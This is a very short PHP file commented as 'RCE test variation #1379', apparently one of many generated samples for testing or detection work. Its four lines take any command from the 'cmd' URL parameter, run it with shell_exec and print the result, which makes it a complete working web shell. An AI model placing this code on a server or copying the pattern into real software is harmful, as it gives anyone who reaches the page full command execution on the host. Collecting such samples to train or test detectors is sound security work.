<?php
// RCE test variation #1379
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>